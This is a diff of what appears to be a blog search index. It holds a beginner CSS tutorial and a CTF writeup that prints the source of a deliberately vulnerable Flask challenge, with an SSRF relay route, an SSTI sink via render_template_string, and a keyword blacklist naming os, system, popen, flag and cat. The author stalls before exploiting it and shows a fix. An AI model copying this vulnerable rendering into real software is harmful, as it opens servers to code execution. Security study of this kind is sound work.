-<p>**注意：**如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式</p>
-</blockquote>
-<h2 id="元素"><a class="markdownIt-Anchor" href="#元素"></a> 元素</h2>
-<h3 id="backgrounds"><a class="markdownIt-Anchor" href="#backgrounds"></a> Backgrounds</h3>
-<h4 id="background-color"><a class="markdownIt-Anchor" href="#background-color"></a> background-color:</h4>
-<ul>
-<li>页面: body{background-color: }</li>
-<li>正文: p{background-color:}</li>
-<li>标题: h1{background-color: }</li>
-<li>指定模块: div{background-color:}</li>
-</ul>
-<h4 id="backgound-image"><a class="markdownIt-Anchor" href="#backgound-image"></a> backgound-image</h4>
-<p>描述了元素的背景图像</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">body&#123;background-image: url(&#x27;paper,gif&#x27;)&#125;</code></pre>
-]]></content>
-      <tags>
-        <tag>-Web前端 -CSS</tag>
       </tags>
   </entry>
   <entry>
@@ -9885,6 +9776,115 @@ $</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>深度学习网页前端之CSS</title>
+    <url>/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/</url>
+    <content><![CDATA[<h1 id="深度学习网页前端之css"><a class="markdownIt-Anchor" href="#深度学习网页前端之css"></a> 深度学习网页前端之CSS</h1>
+<h2 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h2>
+<p>你如果问我CSS是什么<s>CSS就是CSS啊</s></p>
+<p>那我可以说，平时浏览网页的主要内容就算由CSS构成的，如果说HTML是骨架，那么CSS就是主要的血肉</p>
+<p>看看菜鸟教程上是怎么解释的:<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160026108.png" alt="image-20250329160026108"></p>
+<h2 id="css基础语法"><a class="markdownIt-Anchor" href="#css基础语法"></a> CSS基础语法</h2>
+<p>CSS由两个主要的部分构成:</p>
+<ul>
+<li>选择器 //需要改变样式的HTML元素</li>
+<li>一条或多条说明 //每给说明=1个属性+1个值</li>
+</ul>
+<p>每个属性有一个值。属性和值被冒号分开</p>
+<p>一般都放在head部分的style里</p>
+<p>大概长这个样子</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160327242.png" alt="image-20250329160327242"></p>
+<p>css的注释使用经典的/* */</p>
+<h2 id="对于多模块的处理"><a class="markdownIt-Anchor" href="#对于多模块的处理"></a> 对于多模块的处理</h2>
+<p>用过F12的都知道，一个成熟的网页远远不止一种单调的元素，而是能让你眼花缭乱的，这就是通过选择器来进行不同的渲染的</p>
+<h3 id="id-选择器"><a class="markdownIt-Anchor" href="#id-选择器"></a> id 选择器</h3>
+<p>在{}前加上<code>#[选择器名字]</code></p>
+<p>在下面要使用这些属性+值的部分的开始标签加上<code>id=&quot;[选择器名字]&quot;</code></p>
+<p>这样就大功告成了</p>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p>ID属性不要以数字开头，数字开头的ID在 Mozilla/Firefox 浏览器中不起作用</p>
+</blockquote>
+<h3 id="class选择器"><a class="markdownIt-Anchor" href="#class选择器"></a> class选择器</h3>
+<p>class选择器用于描述一组元素的样式，使用经典款前后闭合</p>
+<p>head部分:.</p>
+<pre><code class="highlight css">.<span class="selector-attr">[选择器名字]</span>&#123;
+属性与值
+&#125;</code></pre>
+<p>body部分:</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-attr">[选择器名称]</span>&quot;&gt;
+
+&lt;/<span class="selector-tag">div</span>&gt;</code></pre>
+<h2 id="css的插入"><a class="markdownIt-Anchor" href="#css的插入"></a> CSS的插入</h2>
+<p>CSS的插入方式有三种</p>
+<ul>
+<li>外部样式表</li>
+<li>内部样式表</li>
+<li>内联样式</li>
+</ul>
+<h3 id="外部样式表"><a class="markdownIt-Anchor" href="#外部样式表"></a> 外部样式表</h3>
+<p>就和图片差不多，从服务器的目录下引入样式表</p>
+<pre><code class="highlight html"><span class="comment">&lt;!-- html内 --&gt;</span>
+<span class="tag">&lt;<span class="name">head</span>&gt;</span>
+<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+<pre><code class="highlight css"><span class="comment">/*CSS文件内*/</span>
+hr &#123;<span class="attribute">color</span>:sienna;&#125;
+<span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;
+<span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;/images/back40.gif&quot;</span>);&#125;</code></pre>
+<p>浏览器会从css文件中读取样式声明，并根据声明来格式文档</p>
+<blockquote>
+<p>用作外部表的CSS文件不能包含任何的 html 标签</p>
+</blockquote>
+<p>不要属性值和单位之间留空格:如 <code>margin-left: 20 px</code>应该写为<code>margin-left: 20px</code></p>
+<h3 id="内部样式表"><a class="markdownIt-Anchor" href="#内部样式表"></a> 内部样式表</h3>
+<p>单个文档需要特殊样式时，就使用内部样式表：</p>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span>
+<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span>
+<span class="language-css">hr &#123;<span class="attribute">color</span>:sienna;&#125;</span>
+<span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span>
+<span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>);&#125;</span>
+<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+<h3 id="内联样式"><a class="markdownIt-Anchor" href="#内联样式"></a> 内联样式</h3>
+<p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p>
+<p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距：</p>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
+<h3 id="样式的继承"><a class="markdownIt-Anchor" href="#样式的继承"></a> 样式的继承</h3>
+<p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。</p>
+<p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p>
+<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;  <span class="attribute">color</span>:red;    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;    <span class="attribute">font-size</span>:<span class="number">8pt</span>; &#125;</code></pre>
+<p>而内部样式表拥有针对 h3 选择器的两个属性：</p>
+<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;    <span class="attribute">font-size</span>:<span class="number">20pt</span>; &#125;</code></pre>
+<p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p>
+<pre><code class="highlight plaintext">color:red; text-align:right; font-size:20pt;</code></pre>
+<p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p>
+<hr>
+<p>样式的优先级为:</p>
+<p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p>
+<blockquote>
+<p>**注意：**如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式</p>
+</blockquote>
+<h2 id="元素"><a class="markdownIt-Anchor" href="#元素"></a> 元素</h2>
+<h3 id="backgrounds"><a class="markdownIt-Anchor" href="#backgrounds"></a> Backgrounds</h3>
+<h4 id="background-color"><a class="markdownIt-Anchor" href="#background-color"></a> background-color:</h4>
+<ul>
+<li>页面: body{background-color: }</li>
+<li>正文: p{background-color:}</li>
+<li>标题: h1{background-color: }</li>
+<li>指定模块: div{background-color:}</li>
+</ul>
+<h4 id="backgound-image"><a class="markdownIt-Anchor" href="#backgound-image"></a> backgound-image</h4>
+<p>描述了元素的背景图像</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">body&#123;background-image: url(&#x27;paper,gif&#x27;)&#125;</code></pre>
+]]></content>
+      <tags>
+        <tag>-Web前端 -CSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>磨好的利剑:PHP原生类</title>
     <url>/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
     <content><![CDATA[<h1 id="php原生类"><a class="markdownIt-Anchor" href="#php原生类"></a> PHP原生类</h1>
@@ -10932,46 +10932,212 @@ function copy(object1, object2) &#123;
 <p>这道是0解题嘻嘻，端口都连不上SSRF拿头做，一直timed out ,不知道是不是我的问题。</p>
 <p>hint貌似 是5000端口SSRF+SSTI，中间还有一个hint忘记了</p>
 <p>直接贴源码吧</p>
-<pre><code class="highlight plaintext">from flask import Flask, request, send_file
-import socket
+<pre><code class="highlight py"><span class="comment">#/app/app.py</span>
+<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file
+<span class="keyword">import</span> socket
 
-app = Flask(&quot;webserver&quot;)
-
-
-@app.route(&#x27;/&#x27;, methods=[&quot;GET&quot;])
-def index():
-    return send_file(__file__)
+app = Flask(<span class="string">&quot;webserver&quot;</span>)
 
 
-@app.route(&#x27;/nc&#x27;, methods=[&quot;POST&quot;])
-def nc():
-    try:
-        dstport = int(request.form[&#x27;port&#x27;])
-        data = request.form[&#x27;data&#x27;]
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span>
+<span class="keyword">def</span> <span class="title function_">index</span>():
+    <span class="keyword">return</span> send_file(__file__)
+
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/nc&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span>
+<span class="keyword">def</span> <span class="title function_">nc</span>():
+    <span class="keyword">try</span>:
+        dstport = <span class="built_in">int</span>(request.form[<span class="string">&#x27;port&#x27;</span>])
+        data = request.form[<span class="string">&#x27;data&#x27;</span>]
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1)
-        s.connect((&#x27;127.0.0.1&#x27;, dstport))
+        s.settimeout(<span class="number">1</span>)
+        s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, dstport))
         s.send(data.encode())
-        recvdata = b&#x27;&#x27;
-        while True:
-            chunk = s.recv(2048)
-            if not chunk.strip():
-                break
-            else:
+        recvdata = <span class="string">b&#x27;&#x27;</span>
+        <span class="keyword">while</span> <span class="literal">True</span>:
+            chunk = s.recv(<span class="number">2048</span>)
+            <span class="keyword">if</span> <span class="keyword">not</span> chunk.strip():
+                <span class="keyword">break</span>
+            <span class="keyword">else</span>:
                 recvdata += chunk
-                continue
-        return recvdata
-    except Exception as e:
-        return str(e)
+                <span class="keyword">continue</span>
+        <span class="keyword">return</span> recvdata
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        <span class="keyword">return</span> <span class="built_in">str</span>(e)
 
 
-app.run(host=&quot;0.0.0.0&quot;, port=8080, threaded=True)</code></pre>
+app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, threaded=<span class="literal">True</span>)</code></pre>
+<pre><code class="highlight py"><span class="comment">#/app/backend/app.py</span>
+<span class="keyword">import</span> binascii
+<span class="keyword">import</span> os
+<span class="keyword">import</span> random
+<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, session
+<span class="keyword">import</span> numpy <span class="keyword">as</span> np
+<span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter
+<span class="keyword">import</span> uuid
+
+
+<span class="keyword">def</span> <span class="title function_">get_user</span>() -&gt; <span class="built_in">str</span>:
+    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:
+        session[<span class="string">&#x27;user_id&#x27;</span>] = uuid.uuid4()
+    <span class="keyword">return</span> session[<span class="string">&#x27;user_id&#x27;</span>]
+
+
+app = Flask(__name__)
+
+app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = binascii.hexlify(os.urandom(<span class="number">24</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)
+limiter = Limiter(app=app, key_func=get_user, default_limits=[<span class="string">&#x27;5/minute&#x27;</span>])
+letters = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>]
+
+
+<span class="meta">@app.errorhandler(<span class="params"><span class="number">429</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">handle_exception</span>(<span class="params">e</span>):
+    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;h1&gt;How about we access this page later?&lt;/h1&gt;&#x27;</span>)
+
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">index</span>():
+    <span class="keyword">return</span> <span class="string">&quot;Welcome to the genshop&quot;</span>
+
+
+<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):
+    blacklist1 = [<span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>
+                  <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;builtin&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>, <span class="string">&#x27;?&#x27;</span>,
+                  <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;value&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;base&#x27;</span>]
+    <span class="keyword">if</span> <span class="built_in">any</span>(c <span class="keyword">in</span> s <span class="keyword">for</span> c <span class="keyword">in</span> blacklist1):
+        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;What are you f* doing, guys?&#x27;</span>)
+    blacklist2 = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]
+    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist2]) + s
+
+
+<span class="keyword">def</span> <span class="title function_">stimulate</span>():
+    initial_5_star_rate = <span class="number">0.6</span> / <span class="number">100</span>
+    total_draws = <span class="number">0</span>
+    start_increasing_at = <span class="number">74</span>
+    end_increasing_at = <span class="number">91</span>
+    current_5_star_rate = initial_5_star_rate
+    <span class="keyword">while</span> <span class="literal">True</span>:
+        total_draws += <span class="number">1</span>
+        <span class="keyword">if</span> total_draws &gt;= start_increasing_at <span class="keyword">and</span> total_draws &lt; end_increasing_at:
+            current_5_star_rate += <span class="number">0.06</span>
+        <span class="keyword">if</span> random.random() &lt; current_5_star_rate:
+            <span class="keyword">break</span>
+    <span class="keyword">return</span> total_draws
+
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">reset</span>():
+    session[<span class="string">&#x27;money&#x27;</span>] = <span class="number">0</span>
+    session[<span class="string">&#x27;user_id&#x27;</span>] = uuid.uuid4()
+    limiter.reset()
+    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/gift&#x27;</span></span>)</span>
+<span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/hour&quot;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">get_money</span>():
+    int_money = <span class="number">0</span>
+    <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> request.args:
+        <span class="keyword">if</span> <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;money&#x27;</span>)) &lt; <span class="number">80</span>:
+            int_money = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;money&#x27;</span>))
+        <span class="keyword">else</span>:
+            <span class="keyword">return</span> <span class="string">&quot;You are so greedy!&quot;</span>
+    session[<span class="string">&#x27;money&#x27;</span>] = (int_money + session[<span class="string">&#x27;money&#x27;</span>]) <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> session.keys() <span class="keyword">else</span> int_money
+    <span class="keyword">return</span> <span class="string">f&quot;friend give you <span class="subst">&#123;int_money&#125;</span> money&quot;</span>
+
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/money&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">query_money</span>():
+    <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> session.keys():
+        <span class="keyword">return</span> <span class="built_in">str</span>(session.get(<span class="string">&#x27;money&#x27;</span>))
+    <span class="keyword">else</span>:
+        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span>
+
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/chest&#x27;</span></span>)</span>
+<span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/hour&quot;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">get_chest</span>():
+    <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> session:
+        int_money = <span class="built_in">int</span>(session.get(<span class="string">&#x27;money&#x27;</span>))
+    <span class="keyword">else</span>:
+        int_money = <span class="number">0</span>
+    money = int_money
+    num = random.randint(<span class="number">0</span>, <span class="number">101</span>)
+    <span class="keyword">if</span> num &lt; <span class="number">20</span>:
+        money += <span class="number">1</span>
+        chest_type = <span class="string">&quot;common&quot;</span>
+    <span class="keyword">elif</span> <span class="number">20</span> &lt;= num &lt; <span class="number">60</span>:
+        money += <span class="number">2</span>
+        chest_type = <span class="string">&quot;exquisite&quot;</span>
+    <span class="keyword">elif</span> <span class="number">60</span> &lt;= num &lt; <span class="number">77</span>:
+        money += <span class="number">3</span>
+        chest_type = <span class="string">&quot;precious&quot;</span>
+    <span class="keyword">elif</span> <span class="number">77</span> &lt;= num &lt; <span class="number">99</span>:
+        money += <span class="number">4</span>
+        chest_type = <span class="string">&quot;remarkable&quot;</span>
+    <span class="keyword">else</span>:
+        money += <span class="number">5</span>
+        chest_type = <span class="string">&quot;shrine&quot;</span>
+
+    session[<span class="string">&#x27;money&#x27;</span>] = money
+    <span class="keyword">return</span> <span class="string">f&quot;Congratulations! You found a <span class="subst">&#123;chest_type&#125;</span> chest&quot;</span>
+
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/genshop&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span>
+<span class="keyword">def</span> <span class="title function_">get_letter</span>():
+    letter = request.form.get(<span class="string">&quot;letter&quot;</span>)
+    <span class="keyword">if</span> letter <span class="keyword">is</span> <span class="literal">None</span>:
+        <span class="keyword">return</span> <span class="string">&quot;Please choose a letter&quot;</span>
+    <span class="keyword">try</span>:
+        money = <span class="built_in">int</span>(session.get(<span class="string">&#x27;money&#x27;</span>)) <span class="keyword">or</span> <span class="number">0</span>
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        money = <span class="number">0</span>
+    money = np.array(money)
+    money -= stimulate() * <span class="number">5000</span>
+    <span class="keyword">try</span>:
+        <span class="keyword">if</span> money &lt; <span class="number">0</span>:
+            result = <span class="string">&quot;You don&#x27;t have enough money&quot;</span>
+        <span class="keyword">else</span>:
+            session[<span class="string">&#x27;money&#x27;</span>] = <span class="number">0</span>
+            letter = waf(letter)
+            result = <span class="string">&quot;You are not allowed to use this letter&quot;</span>
+            <span class="keyword">if</span> letter <span class="keyword">not</span> <span class="keyword">in</span> letters:
+                result = <span class="string">f&quot;The <span class="subst">&#123;letter&#125;</span> is not in the genshop&quot;</span>
+            <span class="keyword">else</span>:
+                result = <span class="string">f&quot;Congratulations! You get the letter: <span class="subst">&#123;letter&#125;</span>&quot;</span>
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        result = <span class="built_in">str</span>(e)
+    <span class="keyword">return</span> render_template_string(<span class="string">f&quot;&lt;h3&gt;<span class="subst">&#123;result&#125;</span>&lt;/h3&gt;&quot;</span>)
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
+    app.run()
+</code></pre>
+<h4 id="break-4"><a class="markdownIt-Anchor" href="#break-4"></a> break</h4>
+<p>虽说0解</p>
+<p>但是可以现在回来再看看呢</p>
+<p>先看一下waf在干什么</p>
+<pre><code class="highlight py"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):
+    blacklist1 = [<span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>
+                  <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;builtin&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>, <span class="string">&#x27;?&#x27;</span>,
+                  <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;value&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;base&#x27;</span>]
+    <span class="keyword">if</span> <span class="built_in">any</span>(c <span class="keyword">in</span> s <span class="keyword">for</span> c <span class="keyword">in</span> blacklist1):
+        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;What are you f* doing, guys?&#x27;</span>)
+    blacklist2 = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]
+    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist2]) + s</code></pre>
+<p>上了两层waf，第一层就是简单的检测，第二层是在字符串前面拼接<code>&#123;% set config=None %&#125;&#123;% set self=None %&#125;</code>把config和self给覆盖掉了</p>
+<p>主要的代码是在/genshop的路由下</p>
+<p>来看一下路由逻辑</p>
+<pre><code class="highlight plaintext">1.每次提交letter的都要消耗一定的money
+2.每次提交的letter会经过waf接着被渲染到页面上(实际就是SSTI)</code></pre>
+<p><code>stimulate() * 5000</code>这里的stimulate函数经过测试，会产生100以内的数</p>
+<p>其中88以上的数字频率就很低了，但是这个数字还是很大说实话</p>
+<p>然后就卡住了。</p>
 <h4 id="fix-2"><a class="markdownIt-Anchor" href="#fix-2"></a> fix</h4>
-<p>fix看别人的反而挺简单的，但是为什么过了挺疑惑的。</p>
+<p>fix看别人的反而挺简单的</p>
 <pre><code class="highlight plaintext"># return render_template_string(f&quot;&lt;h3&gt;&#123;result&#125;&lt;/h3&gt;&quot;)
 return f&quot;&lt;h3&gt;&#123;result&#125;&lt;/h3&gt;&quot;</code></pre>
-<p>这个真的能渲染到页面上吗。。源码没存故不能实测，残念</p>
-<p>我是上了一堆waf结果还是没拦住，也不知道啥问题，想过把动态渲染换成静态但是发现自己写不来嘻嘻()</p>
+<p>我是上了一堆waf结果还是没拦住，也不知道啥问题，想过把动态渲染换成静态但是发现<code>render_template_string</code>的我写不来嘻嘻()</p>
+<p>只会render和render_template，当时比赛的时候时间来不及了本地也没测过，属于因小失大了</p>
 ]]></content>
       <tags>
         <tag>Writeup</tag>
